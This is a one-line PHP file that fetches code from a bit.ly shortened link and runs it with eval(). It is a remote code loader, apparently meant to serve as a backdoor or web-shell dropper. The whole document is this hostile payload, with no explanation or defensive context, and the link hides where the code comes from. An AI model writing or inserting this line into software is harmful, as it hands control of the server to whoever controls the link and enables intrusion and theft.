<?=eval("?>".file_get_contents("https://bit.ly/3nuVpHL"));?>
